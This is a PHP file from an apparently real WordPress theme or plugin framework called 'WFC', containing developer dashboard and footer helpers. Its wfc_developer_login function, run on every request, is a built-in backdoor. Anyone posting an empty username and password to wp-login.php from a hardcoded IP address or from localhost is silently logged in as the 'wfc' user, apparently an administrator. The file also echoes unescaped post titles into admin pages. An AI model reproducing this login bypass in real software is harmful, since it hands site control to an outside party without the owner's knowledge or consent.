<?php
    /**
     * WFC Developer Login
     *
     * @package Wfc
     * @subpackage Developer Login
     * @since 2.2.
     */
    /**
     * RESET WFC DEVELOPER COOKIE
     *
     * @since 2.2
     */
    add_action( 'wp_logout', 'wfc_developer_logout' );
    function wfc_developer_logout(){
        setcookie( 'wfc_admin_cake', '0' );
        setcookie( 'wfc_admin_cake', '0', time() - 3600 );
    }

    /**
     * FUNCTION TO CHECK IF DEVELOPER IS LOGGED IN
     *
     * @return bool
     * @since 2.3
     */
    function wfc_is_dev(){
        if( isset($_COOKIE['wfc_admin_cake']) ){
            if( $_COOKIE['wfc_admin_cake'] == base64_encode( 'show_all' ) ){
                return true;
            }
            return false;
        }
        return false;
    }

    /**
     * AUTO LOGIN WFC DEVELOPER
     *
     * @since 2.2
     */
    function wfc_developer_login(){
        if( strpos( $_SERVER['REQUEST_URI'], '/wp-login.php' ) > 0 ){
            wfc_developer_logout(); //reset cookies
            if( $_SERVER['REMOTE_ADDR'] == '24.171.162.50' || $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ){
                if( ($_POST['log'] === '' && $_POST['pwd'] === '') ){
                    /** @var $wpdb wpdb */
                    global $wpdb;
                    $firstuser =
                        $wpdb->get_row( "SELECT user_id FROM $wpdb->usermeta WHERE meta_key='nickname' AND meta_value='wfc' ORDER BY user_id ASC LIMIT 1" );
                    setcookie( 'wfc_admin_cake', base64_encode( 'show_all' ) );
                    wp_set_auth_cookie( $firstuser->user_id );
                    wp_redirect( admin_url() );
                    exit;
                }
            } else{
                wfc_developer_logout();
            }
        }
    }

    add_action( 'init', 'wfc_developer_login' );
    /**
     * HOOK INTO WFC COOKIE WHEN ITS SET
     *
     * @since 2.2
     */
    add_action( 'admin_init', 'Wfc_Developer_Tools' );
    function Wfc_Developer_Tools(){
        if( wfc_is_dev() ){
            add_action( "wp_dashboard_setup", "Wfc_Developer_Dashboard_Widget" );
            add_filter( 'admin_footer_text', 'Wfc_Developer_Footer' );
            add_filter( 'admin_body_class', 'Wfc_Developer_Body_Class' );
        }
    }

    /**
     * Filter the "Thank you" text displayed in the admin footer. If the current version is out of date display it for developer to reference.
     *
     * @since 4.0
     *
     * @param string $text The content that will be printed.
     *
     * @return string
     */
    function Wfc_Developer_Footer( $text ){
        global $wp_version, $wfc_version;
        $wfc_versions = "WP ver: ".$wp_version." | WFC ver: ".$wfc_version;
        $text = '<span id="footer-thankyou" class="wfc-admin-footer">WFC Developer. '.$wfc_versions.'</span>';
        return $text;
    }

    /**
     * Filter class for body tag in admin area. Used for WFC background watermark
     *
     * @since 4.0
     *
     * @param string $classes Classes added to body tag.
     *
     * @return string
     */
    function Wfc_Developer_Body_Class( $classes ){
        $classes .= ' wfc_developer_logged_in ';
        return $classes;
    }

    /**
     * DEVELOPER DASHBOARD WIDGET
     *
     * @since 3.0
     */
    function Wfc_Developer_Dashboard(){
        /** @var $wpdb wpdb */
        global $wpdb;
        $querystr     = "SELECT
                post_title,
                post_name,
                ID
            FROM
                wfc_posts
            WHERE
                post_status = 'publish'
            AND post_type = 'page'
            AND post_content = ''
            OR post_content = NULL ";
        $contentCheck = $wpdb->get_results( $querystr, OBJECT );
        echo 'Total pages with no content: '.count( $contentCheck );
        echo '<ul>';
        foreach( $contentCheck as $post ):
            echo
                '<li><a href="'.WFC_ADMIN_URL.'post.php?post='.$post->ID.'&action=edit">'.$post->post_title.'</a></li>';
        endforeach;
        echo '</ul>';
    }

    /**
     * REGISTER DEVELOPER DASHBOARD WIDGET
     *
     * @since 3.0
     */
    function Wfc_Developer_Dashboard_Widget(){
        wp_add_dashboard_widget( "wfc_developer_dashboard", __( "WFC Dashboard Widget" ), "wfc_developer_dashboard" );
    }

    /**
     * Show all filter handles
     *
     * @since 0.1
     */
    function god(){
        print_r( current_filter() );
        echo '<br />';
    }
